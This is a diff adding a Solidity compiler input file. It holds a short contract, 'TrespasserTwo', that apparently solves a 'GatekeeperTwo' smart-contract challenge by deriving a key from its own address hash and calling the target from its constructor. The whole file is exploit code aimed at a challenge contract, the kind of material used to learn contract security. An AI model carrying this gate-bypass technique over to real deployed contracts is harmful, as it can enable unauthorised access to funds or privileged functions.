@@ -1,0 +1,35 @@
+{
+  "language": "Solidity",
+  "sources": {
+    "contracts/TrespasserTwo.sol": {
+      "content": "//SDPX-License-Identifier: MIT\n\npragma solidity 0.6.0;\n\ncontract TrespasserTwo {\n  constructor() public {\n    address gatekeeperTwo = 0xf7B57E0Da560cC970a5F418eC3d5FDcFB457836F;\n\n    bytes8 _key = bytes8(\n      (uint64(0) - 1) ^\n        uint64(bytes8(keccak256(abi.encodePacked(address(this)))))\n    );\n\n    (bool success, ) = gatekeeperTwo.call(\n      abi.encodeWithSignature(\"enter(bytes8)\", _key)\n    );\n    require(success, \"Could not trespass.\");\n  }\n}\n"
+    }
+  },
+  "settings": {
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "outputSelection": {
+      "*": {
+        "*": [
+          "abi",
+          "evm.bytecode",
+          "evm.deployedBytecode",
+          "evm.methodIdentifiers",
+          "metadata",
+          "devdoc",
+          "userdoc",
+          "storageLayout",
+          "evm.gasEstimates"
+        ],
+        "": [
+          "ast"
+        ]
+      }
+    },
+    "metadata": {
+      "useLiteralContent": true
+    }
+  }
+}
